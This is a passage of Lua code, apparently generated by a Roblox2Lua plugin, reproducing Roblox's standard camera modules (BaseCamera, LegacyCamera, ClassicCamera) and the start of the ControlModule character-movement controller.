				if (delayExpired or not self.vrRotateKeyCooldown[Enum.KeyCode.Thumbstick2]) then
					local sign = 1
					if vrGamepadRotation.x < 0 then
						sign = -1
					end
					vrRotateSum = vrRotateSum + self:GetRotateAmountValue(vrRotationIntensity) * sign
					self.vrRotateKeyCooldown[Enum.KeyCode.Thumbstick2] = true
				end
			elseif math.abs(vrGamepadRotation.x) < self:GetActivateValue() - 0.1 then
				self.vrRotateKeyCooldown[Enum.KeyCode.Thumbstick2] = nil
			end
		
			self.vrRotateKeyCooldown[Enum.KeyCode.Left] = nil
			self.vrRotateKeyCooldown[Enum.KeyCode.Right] = nil
		
			if vrRotateSum ~= ZERO_VECTOR2 then
				self.lastVRRotationTime = tick()
			end
		
			return vrRotateSum
		end
		
		function BaseCamera:CancelCameraFreeze(keepConstraints)
			if not keepConstraints then
				self.cameraTranslationConstraints = Vector3.new(self.cameraTranslationConstraints.x, 1, self.cameraTranslationConstraints.z)
			end
			if self.cameraFrozen then
				self.trackingHumanoid = nil
				self.cameraFrozen = false
			end
		end
		
		function BaseCamera:StartCameraFreeze(subjectPosition, humanoidToTrack)
			if not self.cameraFrozen then
				self.humanoidJumpOrigin = subjectPosition
				self.trackingHumanoid = humanoidToTrack
				self.cameraTranslationConstraints = Vector3.new(self.cameraTranslationConstraints.x, 0, self.cameraTranslationConstraints.z)
				self.cameraFrozen = true
			end
		end
		
		function BaseCamera:OnNewCameraSubject()
			if self.subjectStateChangedConn then
				self.subjectStateChangedConn:Disconnect()
				self.subjectStateChangedConn = nil
			end
		
			local humanoid = workspace.CurrentCamera and workspace.CurrentCamera.CameraSubject
			if self.trackingHumanoid ~= humanoid then
				self:CancelCameraFreeze()
			end
			if humanoid and humanoid:IsA("Humanoid") then
				self.subjectStateChangedConn = humanoid.StateChanged:Connect(function(oldState, newState)
					if VRService.VREnabled and newState == Enum.HumanoidStateType.Jumping and not self.inFirstPerson then
						self:StartCameraFreeze(self:GetSubjectPosition(), humanoid)
					elseif newState ~= Enum.HumanoidStateType.Jumping and newState ~= Enum.HumanoidStateType.Freefall then
						self:CancelCameraFreeze(true)
					end
				end)
			end
		end
		
		function BaseCamera:GetVRFocus(subjectPosition, timeDelta)
			local lastFocus = self.LastCameraFocus or subjectPosition
			if not self.cameraFrozen then
				self.cameraTranslationConstraints = Vector3.new(self.cameraTranslationConstraints.x, math.min(1, self.cameraTranslationConstraints.y + 0.42 * timeDelta), self.cameraTranslationConstraints.z)
			end
		
			local newFocus
			if self.cameraFrozen and self.humanoidJumpOrigin and self.humanoidJumpOrigin.y > lastFocus.y then
				newFocus = CFrame.new(Vector3.new(subjectPosition.x, math.min(self.humanoidJumpOrigin.y, lastFocus.y + 5 * timeDelta), subjectPosition.z))
			else
				newFocus = CFrame.new(Vector3.new(subjectPosition.x, lastFocus.y, subjectPosition.z):lerp(subjectPosition, self.cameraTranslationConstraints.y))
			end
		
			if self.cameraFrozen then
				-- No longer in 3rd person
				if self.inFirstPerson then -- not VRService.VREnabled
					self:CancelCameraFreeze()
				end
				-- This case you jumped off a cliff and want to keep your character in view
				-- 0.5 is to fix floating point error when not jumping off cliffs
				if self.humanoidJumpOrigin and subjectPosition.y < (self.humanoidJumpOrigin.y - 0.5) then
					self:CancelCameraFreeze()
				end
			end
		
			return newFocus
		end
		
		function BaseCamera:GetRotateAmountValue(vrRotationIntensity)
			vrRotationIntensity = vrRotationIntensity or StarterGui:GetCore("VRRotationIntensity")
			if vrRotationIntensity then
				if vrRotationIntensity == "Low" then
					return VR_LOW_INTENSITY_ROTATION
				elseif vrRotationIntensity == "High" then
					return VR_HIGH_INTENSITY_ROTATION
				end
			end
			return ZERO_VECTOR2
		end
		
		function BaseCamera:GetRepeatDelayValue(vrRotationIntensity)
			vrRotationIntensity = vrRotationIntensity or StarterGui:GetCore("VRRotationIntensity")
			if vrRotationIntensity then
				if vrRotationIntensity == "Low" then
					return VR_LOW_INTENSITY_REPEAT
				elseif vrRotationIntensity == "High" then
					return VR_HIGH_INTENSITY_REPEAT
				end
			end
			return 0
		end
		
		function BaseCamera:Update(dt)
			error("BaseCamera:Update() This is a virtual function that should never be getting called.", 2)
		end
		
		return BaseCamera
		
	end[legacy_camera] = function()
		--[[
			LegacyCamera - Implements legacy controller types: Attach, Fixed, Watch
			2018 Camera Update - AllYourBlox
		--]]
		
		
		local FFlagUserCameraPositionCheckWarning
		do
		    local success, result = pcall(function()
		        return UserSettings():IsUserFeatureEnabled("UserCameraPositionCheckWarning")
		    end)
		    FFlagUserCameraPositionCheckWarning = success and result
		end
		
		local ZERO_VECTOR2 = Vector2.new()
		local PITCH_LIMIT = math.rad(80)
		
		local Util = require(script.Parent:WaitForChild("CameraUtils"))
		local CameraInput = require(script.Parent:WaitForChild("CameraInput"))
		
		--[[ Services ]]--
		local PlayersService = game:GetService('Players')
		
		--[[ The Module ]]--
		local BaseCamera = require(script.Parent:WaitForChild("BaseCamera"))
		local LegacyCamera = setmetatable({}, BaseCamera)
		LegacyCamera.__index = LegacyCamera
		
		function LegacyCamera.new()
			local self = setmetatable(BaseCamera.new(), LegacyCamera)
		
			self.cameraType = Enum.CameraType.Fixed
			self.lastUpdate = tick()
			self.lastDistanceToSubject = nil
		
			return self
		end
		
		function LegacyCamera:GetModuleName()
			return "LegacyCamera"
		end
		
		--[[ Functions overridden from BaseCamera ]]--
		function LegacyCamera:SetCameraToSubjectDistance(desiredSubjectDistance)
			return BaseCamera.SetCameraToSubjectDistance(self,desiredSubjectDistance)
		end
		
		function LegacyCamera:Update(dt)
		
			-- Cannot update until cameraType has been set
			if not self.cameraType then return end
		
			local now = tick()
			local timeDelta = (now - self.lastUpdate)
			local camera = 	workspace.CurrentCamera
			local newCameraCFrame = camera.CFrame
			local newCameraFocus = camera.Focus
			local player = PlayersService.LocalPlayer
		
			if self.lastUpdate == nil or timeDelta > 1 then
				self.lastDistanceToSubject = nil
			end
			local subjectPosition = self:GetSubjectPosition()
		
			if self.cameraType == Enum.CameraType.Fixed then
				if subjectPosition and player and camera then
					local distanceToSubject = self:GetCameraToSubjectDistance()
					local newLookVector = self:CalculateNewLookVectorFromArg(nil, CameraInput.getRotation())
		
					newCameraFocus = camera.Focus -- Fixed camera does not change focus
					newCameraCFrame = CFrame.new(camera.CFrame.p, camera.CFrame.p + (distanceToSubject * newLookVector))
				end
		
			elseif self.cameraType == Enum.CameraType.Attach then
				local subjectCFrame = self:GetSubjectCFrame()
				local cameraPitch = camera.CFrame:ToEulerAnglesYXZ()
				local _, subjectYaw = subjectCFrame:ToEulerAnglesYXZ()
				
				cameraPitch = math.clamp(cameraPitch - CameraInput.getRotation().Y, -PITCH_LIMIT, PITCH_LIMIT)
				
				newCameraFocus = CFrame.new(subjectCFrame.p)*CFrame.fromEulerAnglesYXZ(cameraPitch, subjectYaw, 0)
				newCameraCFrame = newCameraFocus*CFrame.new(0, 0, self:StepZoom())
		
			elseif self.cameraType == Enum.CameraType.Watch then
				if subjectPosition and player and camera then
					local cameraLook = nil
		
					if FFlagUserCameraPositionCheckWarning then
						if subjectPosition == camera.CFrame.p then
							warn("Camera cannot watch subject in same position as itself")
							return camera.CFrame, camera.Focus
						end
					end
		
					local humanoid = self:GetHumanoid()
					if humanoid and humanoid.RootPart then
						local diffVector = subjectPosition - camera.CFrame.p
						cameraLook = diffVector.unit
		
						if self.lastDistanceToSubject and self.lastDistanceToSubject == self:GetCameraToSubjectDistance() then
							-- Don't clobber the zoom if they zoomed the camera
							local newDistanceToSubject = diffVector.magnitude
							self:SetCameraToSubjectDistance(newDistanceToSubject)
						end
					end
		
					local distanceToSubject = self:GetCameraToSubjectDistance()
					local newLookVector = self:CalculateNewLookVectorFromArg(cameraLook, CameraInput.getRotation())
		
					newCameraFocus = CFrame.new(subjectPosition)
					newCameraCFrame = CFrame.new(subjectPosition - (distanceToSubject * newLookVector), subjectPosition)
		
					self.lastDistanceToSubject = distanceToSubject
				end
			else
				-- Unsupported type, return current values unchanged
				return camera.CFrame, camera.Focus
			end
		
			self.lastUpdate = now
			return newCameraCFrame, newCameraFocus
		end
		
		return LegacyCamera
		
	end[classiccamera] = function()
		--[[
			ClassicCamera - Classic Roblox camera control module
			2018 Camera Update - AllYourBlox
		
			Note: This module also handles camera control types Follow and Track, the
			latter of which is currently not distinguished from Classic
		--]]
		
		-- Local private variables and constants
		local ZERO_VECTOR2 = Vector2.new(0,0)
		
		local tweenAcceleration = math.rad(220) -- Radians/Second^2
		local tweenSpeed = math.rad(0)          -- Radians/Second
		local tweenMaxSpeed = math.rad(250)     -- Radians/Second
		local TIME_BEFORE_AUTO_ROTATE = 2       -- Seconds, used when auto-aligning camera with vehicles
		
		local INITIAL_CAMERA_ANGLE = CFrame.fromOrientation(math.rad(-15), 0, 0)
		local ZOOM_SENSITIVITY_CURVATURE = 0.5
		local FIRST_PERSON_DISTANCE_MIN = 0.5
		
		--[[ Services ]]--
		local PlayersService = game:GetService("Players")
		local VRService = game:GetService("VRService")
		
		local CameraInput = require(script.Parent:WaitForChild("CameraInput"))
		local Util = require(script.Parent:WaitForChild("CameraUtils"))
		
		--[[ The Module ]]--
		local BaseCamera = require(script.Parent:WaitForChild("BaseCamera"))
		local ClassicCamera = setmetatable({}, BaseCamera)
		ClassicCamera.__index = ClassicCamera
		
		function ClassicCamera.new()
			local self = setmetatable(BaseCamera.new(), ClassicCamera)
		
			self.isFollowCamera = false
			self.isCameraToggle = false
			self.lastUpdate = tick()
			self.cameraToggleSpring = Util.Spring.new(5, 0)
		
			return self
		end
		
		function ClassicCamera:GetCameraToggleOffset(dt)
			if self.isCameraToggle then
				local zoom = self.currentSubjectDistance
		
				if CameraInput.getTogglePan() then
					self.cameraToggleSpring.goal = math.clamp(Util.map(zoom, 0.5, self.FIRST_PERSON_DISTANCE_THRESHOLD, 0, 1), 0, 1)
				else
					self.cameraToggleSpring.goal = 0
				end
		
				local distanceOffset = math.clamp(Util.map(zoom, 0.5, 64, 0, 1), 0, 1) + 1
				return Vector3.new(0, self.cameraToggleSpring:step(dt)*distanceOffset, 0)
			end
		
			return Vector3.new()
		end
		
		-- Movement mode standardized to Enum.ComputerCameraMovementMode values
		function ClassicCamera:SetCameraMovementMode(cameraMovementMode)
			BaseCamera.SetCameraMovementMode(self, cameraMovementMode)
		
			self.isFollowCamera = cameraMovementMode == Enum.ComputerCameraMovementMode.Follow
			self.isCameraToggle = cameraMovementMode == Enum.ComputerCameraMovementMode.CameraToggle
		end
		
		function ClassicCamera:Update()
			local now = tick()
			local timeDelta = now - self.lastUpdate
		
			local camera = workspace.CurrentCamera
			local newCameraCFrame = camera.CFrame
			local newCameraFocus = camera.Focus
		
			local overrideCameraLookVector = nil
			if self.resetCameraAngle then
				local rootPart = self:GetHumanoidRootPart()
				if rootPart then
					overrideCameraLookVector = (rootPart.CFrame * INITIAL_CAMERA_ANGLE).lookVector
				else
					overrideCameraLookVector = INITIAL_CAMERA_ANGLE.lookVector
				end
				self.resetCameraAngle = false
			end
		
			local player = PlayersService.LocalPlayer
			local humanoid = self:GetHumanoid()
			local cameraSubject = camera.CameraSubject
			local isInVehicle = cameraSubject and cameraSubject:IsA("VehicleSeat")
			local isOnASkateboard = cameraSubject and cameraSubject:IsA("SkateboardPlatform")
			local isClimbing = humanoid and humanoid:GetState() == Enum.HumanoidStateType.Climbing
		
			if self.lastUpdate == nil or timeDelta > 1 then
				self.lastCameraTransform = nil
			end
			
			local rotateInput = CameraInput.getRotation()
		
			self:StepZoom()
		
			local cameraHeight = self:GetCameraHeight()
		
			-- Reset tween speed if user is panning
			if CameraInput.getRotation() ~= Vector2.new() then
				tweenSpeed = 0
				self.lastUserPanCamera = tick()
			end
		
			local userRecentlyPannedCamera = now - self.lastUserPanCamera < TIME_BEFORE_AUTO_ROTATE
			local subjectPosition = self:GetSubjectPosition()
		
			if subjectPosition and player and camera then
				local zoom = self:GetCameraToSubjectDistance()
				if zoom < 0.5 then
					zoom = 0.5
				end
		
				if self:GetIsMouseLocked() and not self:IsInFirstPerson() then
					-- We need to use the right vector of the camera after rotation, not before
					local newLookCFrame = self:CalculateNewLookCFrameFromArg(overrideCameraLookVector, rotateInput)
		
					local offset = self:GetMouseLockOffset()
					local cameraRelativeOffset = offset.X * newLookCFrame.rightVector + offset.Y * newLookCFrame.upVector + offset.Z * newLookCFrame.lookVector
		
					--offset can be NAN, NAN, NAN if newLookVector has only y component
					if Util.IsFiniteVector3(cameraRelativeOffset) then
						subjectPosition = subjectPosition + cameraRelativeOffset
					end
				else
					local userPanningTheCamera = CameraInput.getRotation() ~= Vector2.new()
		
					if not userPanningTheCamera and self.lastCameraTransform then
		
						local isInFirstPerson = self:IsInFirstPerson()
		
						if (isInVehicle or isOnASkateboard or (self.isFollowCamera and isClimbing)) and self.lastUpdate and humanoid and humanoid.Torso then
							if isInFirstPerson then
								if self.lastSubjectCFrame and (isInVehicle or isOnASkateboard) and cameraSubject:IsA("BasePart") then
									local y = -Util.GetAngleBetweenXZVectors(self.lastSubjectCFrame.lookVector, cameraSubject.CFrame.lookVector)
									if Util.IsFinite(y) then
										rotateInput = rotateInput + Vector2.new(y, 0)
									end
									tweenSpeed = 0
								end
							elseif not userRecentlyPannedCamera then
								local forwardVector = humanoid.Torso.CFrame.lookVector
								tweenSpeed = math.clamp(tweenSpeed + tweenAcceleration * timeDelta, 0, tweenMaxSpeed)
		
								local percent = math.clamp(tweenSpeed * timeDelta, 0, 1)
								if self:IsInFirstPerson() and not (self.isFollowCamera and self.isClimbing) then
									percent = 1
								end
		
								local y = Util.GetAngleBetweenXZVectors(forwardVector, self:GetCameraLookVector())
								if Util.IsFinite(y) and math.abs(y) > 0.0001 then
									rotateInput = rotateInput + Vector2.new(y * percent, 0)
								end
							end
		
						elseif self.isFollowCamera and (not (isInFirstPerson or userRecentlyPannedCamera) and not VRService.VREnabled) then
							-- Logic that was unique to the old FollowCamera module
							local lastVec = -(self.lastCameraTransform.p - subjectPosition)
		
							local y = Util.GetAngleBetweenXZVectors(lastVec, self:GetCameraLookVector())
		
							-- This cutoff is to decide if the humanoid's angle of movement,
							-- relative to the camera's look vector, is enough that
							-- we want the camera to be following them. The point is to provide
							-- a sizable dead zone to allow more precise forward movements.
							local thetaCutoff = 0.4
		
							-- Check for NaNs
							if Util.IsFinite(y) and math.abs(y) > 0.0001 and math.abs(y) > thetaCutoff * timeDelta then
								rotateInput = rotateInput + Vector2.new(y, 0)
							end
						end
					end
				end
		
				if not self.isFollowCamera then
					local VREnabled = VRService.VREnabled
		
					if VREnabled then
						newCameraFocus = self:GetVRFocus(subjectPosition, timeDelta)
					else
						newCameraFocus = CFrame.new(subjectPosition)
					end
		
					local cameraFocusP = newCameraFocus.p
					if VREnabled and not self:IsInFirstPerson() then
						local vecToSubject = (subjectPosition - camera.CFrame.p)
						local distToSubject = vecToSubject.magnitude
		
						local flaggedRotateInput = rotateInput
		
						-- Only move the camera if it exceeded a maximum distance to the subject in VR
						if distToSubject > zoom or flaggedRotateInput.x ~= 0 then
							local desiredDist = math.min(distToSubject, zoom)
							vecToSubject = self:CalculateNewLookVectorFromArg(nil, rotateInput) * desiredDist
							local newPos = cameraFocusP - vecToSubject
							local desiredLookDir = camera.CFrame.lookVector
							if flaggedRotateInput.x ~= 0 then
								desiredLookDir = vecToSubject
							end
							local lookAt = Vector3.new(newPos.x + desiredLookDir.x, newPos.y, newPos.z + desiredLookDir.z)
		
							newCameraCFrame = CFrame.new(newPos, lookAt) + Vector3.new(0, cameraHeight, 0)
						end
					else
						local newLookVector = self:CalculateNewLookVectorFromArg(overrideCameraLookVector, rotateInput)
						newCameraCFrame = CFrame.new(cameraFocusP - (zoom * newLookVector), cameraFocusP)
					end
				else -- is FollowCamera
					local newLookVector = self:CalculateNewLookVectorFromArg(overrideCameraLookVector, rotateInput)
		
					if VRService.VREnabled then
						newCameraFocus = self:GetVRFocus(subjectPosition, timeDelta)
					else
						newCameraFocus = CFrame.new(subjectPosition)
					end
					newCameraCFrame = CFrame.new(newCameraFocus.p - (zoom * newLookVector), newCameraFocus.p) + Vector3.new(0, cameraHeight, 0)
				end
		
				local toggleOffset = self:GetCameraToggleOffset(timeDelta)
				newCameraFocus = newCameraFocus + toggleOffset
				newCameraCFrame = newCameraCFrame + toggleOffset
		
				self.lastCameraTransform = newCameraCFrame
				self.lastCameraFocus = newCameraFocus
				if (isInVehicle or isOnASkateboard) and cameraSubject:IsA("BasePart") then
					self.lastSubjectCFrame = cameraSubject.CFrame
				else
					self.lastSubjectCFrame = nil
				end
			end
		
			self.lastUpdate = now
			return newCameraCFrame, newCameraFocus
		end
		
		function ClassicCamera:EnterFirstPerson()
			self.inFirstPerson = true
			self:UpdateMouseBehavior()
		end
		
		function ClassicCamera:LeaveFirstPerson()
			self.inFirstPerson = false
			self:UpdateMouseBehavior()
		end
		
		return ClassicCamera
		
	end
}

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local control_module = Instance.new("ModuleScript")
control_module.Name = "ControlModule"
control_module.Parent = workspace

local click_to_movecontroller = Instance.new("ModuleScript")
click_to_movecontroller.Name = "ClickToMoveController"
click_to_movecontroller.Parent = control_module

local touch_jump = Instance.new("ModuleScript")
touch_jump.Name = "TouchJump"
touch_jump.Parent = control_module

local gamepad = Instance.new("ModuleScript")
gamepad.Name = "Gamepad"
gamepad.Parent = control_module

local dynamic_thumbstick = Instance.new("ModuleScript")
dynamic_thumbstick.Name = "DynamicThumbstick"
dynamic_thumbstick.Parent = control_module

local base_character_controller = Instance.new("ModuleScript")
base_character_controller.Name = "BaseCharacterController"
base_character_controller.Parent = control_module

local keyboard = Instance.new("ModuleScript")
keyboard.Name = "Keyboard"
keyboard.Parent = control_module

local vehicle_controller = Instance.new("ModuleScript")
vehicle_controller.Name = "VehicleController"
vehicle_controller.Parent = control_module

local touchthumbstick = Instance.new("ModuleScript")
touchthumbstick.Name = "TouchThumbstick"
touchthumbstick.Parent = control_module

local path_display = Instance.new("ModuleScript")
path_display.Name = "PathDisplay"
path_display.Parent = control_module

local click_to_move_display = Instance.new("ModuleScript")
click_to_move_display.Name = "ClickToMoveDisplay"
click_to_move_display.Parent = control_module

local vrnavigation = Instance.new("ModuleScript")
vrnavigation.Name = "VRNavigation"
vrnavigation.Parent = control_module

--// Modules

local modules = {
	[control_module] = function()
		--[[
			ControlModule - This ModuleScript implements a singleton class to manage the
			selection, activation, and deactivation of the current character movement controller.
			This script binds to RenderStepped at Input priority and calls the Update() methods
			on the active controller instances.
		
			The character controller ModuleScripts implement classes which are instantiated and
			activated as-needed, they are no longer all instantiated up front as they were in
			the previous generation of PlayerScripts.
		
			2018 PlayerScripts Update - AllYourBlox
		--]]
		local ControlModule = {}
		ControlModule.__index = ControlModule
		
		--[[ Roblox Services ]]--
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local UserInputService = game:GetService("UserInputService")
		local Workspace = game:GetService("Workspace")
		local UserGameSettings = UserSettings():GetService("UserGameSettings")
		
		-- Roblox User Input Control Modules - each returns a new() constructor function used to create controllers as needed
		local Keyboard = require(script:WaitForChild("Keyboard"))
		local Gamepad = require(script:WaitForChild("Gamepad"))
		local DynamicThumbstick = require(script:WaitForChild("DynamicThumbstick"))
		
		local FFlagUserMakeThumbstickDynamic do
			local success, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserMakeThumbstickDynamic")
			end)
			FFlagUserMakeThumbstickDynamic = success and value
		end
		
		local TouchThumbstick = FFlagUserMakeThumbstickDynamic and DynamicThumbstick or require(script:WaitForChild("TouchThumbstick"))
		
		local FFlagUserFixExternalJumpRequest do
			local success, result = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserFixExternalJumpRequest2")
			end)
			FFlagUserFixExternalJumpRequest = success and result
		end
		
		-- These controllers handle only walk/run movement, jumping is handled by the
		-- TouchJump controller if any of these are active
		local ClickToMove = require(script:WaitForChild("ClickToMoveController"))
		local TouchJump = require(script:WaitForChild("TouchJump"))
		
		local VehicleController = require(script:WaitForChild("VehicleController"))
		
		local CONTROL_ACTION_PRIORITY = Enum.ContextActionPriority.Default.Value
		
		-- Mapping from movement mode and lastInputType enum values to control modules to avoid huge if elseif switching
		local movementEnumToModuleMap = {
			[Enum.TouchMovementMode.DPad] = DynamicThumbstick,
			[Enum.DevTouchMovementMode.DPad] = DynamicThumbstick,
			[Enum.TouchMovementMode.Thumbpad] = DynamicThumbstick,
			[Enum.DevTouchMovementMode.Thumbpad] = DynamicThumbstick,
			[Enum.TouchMovementMode.Thumbstick] = TouchThumbstick,
			[Enum.DevTouchMovementMode.Thumbstick] = TouchThumbstick,
			[Enum.TouchMovementMode.DynamicThumbstick] = DynamicThumbstick,
			[Enum.DevTouchMovementMode.DynamicThumbstick] = DynamicThumbstick,
			[Enum.TouchMovementMode.ClickToMove] = ClickToMove,
			[Enum.DevTouchMovementMode.ClickToMove] = ClickToMove,
		
			-- Current default
			[Enum.TouchMovementMode.Default] = DynamicThumbstick,
		
			[Enum.ComputerMovementMode.Default] = Keyboard,
			[Enum.ComputerMovementMode.KeyboardMouse] = Keyboard,
			[Enum.DevComputerMovementMode.KeyboardMouse] = Keyboard,
			[Enum.DevComputerMovementMode.Scriptable] = nil,
			[Enum.ComputerMovementMode.ClickToMove] = ClickToMove,
			[Enum.DevComputerMovementMode.ClickToMove] = ClickToMove,
		}
		
		-- Keyboard controller is really keyboard and mouse controller
		local computerInputTypeToModuleMap = {
			[Enum.UserInputType.Keyboard] = Keyboard,
			[Enum.UserInputType.MouseButton1] = Keyboard,
			[Enum.UserInputType.MouseButton2] = Keyboard,
			[Enum.UserInputType.MouseButton3] = Keyboard,
			[Enum.UserInputType.MouseWheel] = Keyboard,
			[Enum.UserInputType.MouseMovement] = Keyboard,
			[Enum.UserInputType.Gamepad1] = Gamepad,
			[Enum.UserInputType.Gamepad2] = Gamepad,
			[Enum.UserInputType.Gamepad3] = Gamepad,
			[Enum.UserInputType.Gamepad4] = Gamepad,
		}
		
		local lastInputType
		
		function ControlModule.new()
			local self = setmetatable({},ControlModule)
		
			-- The Modules above are used to construct controller instances as-needed, and this
			-- table is a map from Module to the instance created from it
			self.controllers = {}
		
			self.activeControlModule = nil	-- Used to prevent unnecessarily expensive checks on each input event
			self.activeController = nil
			self.touchJumpController = nil
			self.moveFunction = Players.LocalPlayer.Move
			self.humanoid = nil
			self.lastInputType = Enum.UserInputType.None
		
			-- For Roblox self.vehicleController
			self.humanoidSeatedConn = nil
			self.vehicleController = nil
		
			self.touchControlFrame = nil
		
			self.vehicleController = VehicleController.new(CONTROL_ACTION_PRIORITY)
		
			Players.LocalPlayer.CharacterAdded:Connect(function(char) self:OnCharacterAdded(char) end)
			Players.LocalPlayer.CharacterRemoving:Connect(function(char) self:OnCharacterRemoving(char) end)
			if Players.LocalPlayer.Character then
				self:OnCharacterAdded(Players.LocalPlayer.Character)
			end
		
			RunService:BindToRenderStep("ControlScriptRenderstep", Enum.RenderPriority.Input.Value, function(dt)
				self:OnRenderStepped(dt)
			end)
		
			UserInputService.LastInputTypeChanged:Connect(function(newLastInputType)
				self:OnLastInputTypeChanged(newLastInputType)
			end)
		
		
			UserGameSettings:GetPropertyChangedSignal("TouchMovementMode"):Connect(function()
				self:OnTouchMovementModeChange()
			end)
			Players.LocalPlayer:GetPropertyChangedSignal("DevTouchMovementMode"):Connect(function()
				self:OnTouchMovementModeChange()
			end)
		
			UserGameSettings:GetPropertyChangedSignal("ComputerMovementMode"):Connect(function()
				self:OnComputerMovementModeChange()
			end)
			Players.LocalPlayer:GetPropertyChangedSignal("DevComputerMovementMode"):Connect(function()
				self:OnComputerMovementModeChange()
			end)
		
			--[[ Touch Device UI ]]--
			self.playerGui = nil
			self.touchGui = nil
			self.playerGuiAddedConn = nil
		
			if UserInputService.TouchEnabled then
				self.playerGui = Players.LocalPlayer:FindFirstChildOfClass("PlayerGui")
				if self.playerGui then
					self:CreateTouchGuiContainer()
					self:OnLastInputTypeChanged(UserInputService:GetLastInputType())
				else
					self.playerGuiAddedConn = Players.LocalPlayer.ChildAdded:Connect(function(child)
						if child:IsA("PlayerGui") then
							self.playerGui = child
							self:CreateTouchGuiContainer()
							self.playerGuiAddedConn:Disconnect()
							self.playerGuiAddedConn = nil
							self:OnLastInputTypeChanged(UserInputService:GetLastInputType())
						end
					end)
				end
			else
				self:OnLastInputTypeChanged(UserInputService:GetLastInputType())
			end
		
			return self
		end
		
		-- Convenience function so that calling code does not have to first get the activeController
		-- and then call GetMoveVector on it. When there is no active controller, this function returns
		-- nil so that this case can be distinguished from no current movement (which returns zero vector).
		function ControlModule:GetMoveVector()
			if self.activeController then
				return self.activeController:GetMoveVector()
			end
			return Vector3.new(0,0,0)
		end
		
		function ControlModule:GetActiveController()
			return self.activeController
		end
		
		function ControlModule:EnableActiveControlModule()
			if self.activeControlModule == ClickToMove then
				-- For ClickToMove, when it is the player's choice, we also enable the full keyboard controls.
				-- When the developer is forcing click to move, the most keyboard controls (WASD) are not available, only jump.
				self.activeController:Enable(
					true,
					Players.LocalPlayer.DevComputerMovementMode == Enum.DevComputerMovementMode.UserChoice,
					self.touchJumpController
				)
			elseif self.touchControlFrame then
				self.activeController:Enable(true, self.touchControlFrame)
			else
				self.activeController:Enable(true)
			end
		end
		
		function ControlModule:Enable(enable)
			if not self.activeController then
				return
			end
		
			if enable == nil then
				enable = true
			end
			if enable then
				self:EnableActiveControlModule()
			else
				self:Disable()
			end
		end
		
		-- For those who prefer distinct functions
		function ControlModule:Disable()
			if self.activeController then
				self.activeController:Enable(false)
		
				if self.moveFunction then
					self.moveFunction(Players.LocalPlayer, Vector3.new(0,0,0), true)
				end
			end
		end
		
		
		-- Returns module (possibly nil) and success code to differentiate returning nil due to error vs Scriptable
		function ControlModule:SelectComputerMovementModule()
			if not (UserInputService.KeyboardEnabled or UserInputService.GamepadEnabled) then
				return nil, false
			end
		
			local computerModule
			local DevMovementMode = Players.LocalPlayer.DevComputerMovementMode
		
			if DevMovementMode == Enum.DevComputerMovementMode.UserChoice then
				computerModule = computerInputTypeToModuleMap[lastInputType]
				if UserGameSettings.ComputerMovementMode == Enum.ComputerMovementMode.ClickToMove and computerModule == Keyboard then
					-- User has ClickToMove set in Settings, prefer ClickToMove controller for keyboard and mouse lastInputTypes
					computerModule = ClickToMove
				end
			else
				-- Developer has selected a mode that must be used.
				computerModule = movementEnumToModuleMap[DevMovementMode]
		
				-- computerModule is expected to be nil here only when developer has selected Scriptable
				if (not computerModule) and DevMovementMode ~= Enum.DevComputerMovementMode.Scriptable then
					warn("No character control module is associated with DevComputerMovementMode ", DevMovementMode)
				end
			end
		
			if computerModule then
				return computerModule, true
			elseif DevMovementMode == Enum.DevComputerMovementMode.Scriptable then
				-- Special case where nil is returned and we actually want to set self.activeController to nil for Scriptable
				return nil, true
			else
				-- This case is for when computerModule is nil because of an error and no suitable control module could
				-- be found.
				return nil, false
			end
		end
		
		-- Choose current Touch control module based on settings (user, dev)
		-- Returns module (possibly nil) and success code to differentiate returning nil due to error vs Scriptable
		function ControlModule:SelectTouchModule()
			if not UserInputService.TouchEnabled then
				return nil, false
			end
			local touchModule
			local DevMovementMode = Players.LocalPlayer.DevTouchMovementMode
			if DevMovementMode == Enum.DevTouchMovementMode.UserChoice then
				touchModule = movementEnumToModuleMap[UserGameSettings.TouchMovementMode]
			elseif DevMovementMode == Enum.DevTouchMovementMode.Scriptable then
				return nil, true
			else
				touchModule = movementEnumToModuleMap[DevMovementMode]
			end
			return touchModule, true
		end
		
		local function calculateRawMoveVector(humanoid, cameraRelativeMoveVector)
			local camera = Workspace.CurrentCamera
			if not camera then
				return cameraRelativeMoveVector
			end
		
			if humanoid:GetState() == Enum.HumanoidStateType.Swimming then
				return camera.CFrame:VectorToWorldSpace(cameraRelativeMoveVector)
			end
		
			local c, s
			local _, _, _, R00, R01, R02, _, _, R12, _, _, R22 = camera.CFrame:GetComponents()
			if R12 < 1 and R12 > -1 then
				-- X and Z components from back vector.
				c = R22
				s = R02
			else
				-- In this case the camera is looking straight up or straight down.
				-- Use X components from right and up vectors.
				c = R00
				s = -R01*math.sign(R12)
			end
			local norm = math.sqrt(c*c + s*s)
			return Vector3.new(
				(c*cameraRelativeMoveVector.x + s*cameraRelativeMoveVector.z)/norm,
				0,
				(c*cameraRelativeMoveVector.z - s*cameraRelativeMoveVector.x)/norm
			)
		end
		
		function ControlModule:OnRenderStepped(dt)
			if self.activeController and self.activeController.enabled and self.humanoid then
				-- Give the controller a chance to adjust its state
				self.activeController:OnRenderStepped(dt)
		
				-- Now retrieve info from the controller
				local moveVector = self.activeController:GetMoveVector()
				local cameraRelative = self.activeController:IsMoveVectorCameraRelative()
		
				local clickToMoveController = self:GetClickToMoveController()
				if self.activeController ~= clickToMoveController then
					if moveVector.magnitude > 0 then
						-- Clean up any developer started MoveTo path
						clickToMoveController:CleanupPath()
					else
						-- Get move vector for developer started MoveTo
						clickToMoveController:OnRenderStepped(dt)
						moveVector = clickToMoveController:GetMoveVector()
						cameraRelative = clickToMoveController:IsMoveVectorCameraRelative()
					end
				end
		
				-- Are we driving a vehicle ?
				local vehicleConsumedInput = false
				if self.vehicleController then
					moveVector, vehicleConsumedInput = self.vehicleController:Update(moveVector, cameraRelative, self.activeControlModule==Gamepad)
				end
		
				-- If not, move the player
				-- Verification of vehicleConsumedInput is commented out to preserve legacy behavior,
				-- in case some game relies on Humanoid.MoveDirection still being set while in a VehicleSeat
				--if not vehicleConsumedInput then
					if cameraRelative then
						moveVector = calculateRawMoveVector(self.humanoid, moveVector)
					end
					self.moveFunction(Players.LocalPlayer, moveVector, false)
				--end
		
				-- And make them jump if needed
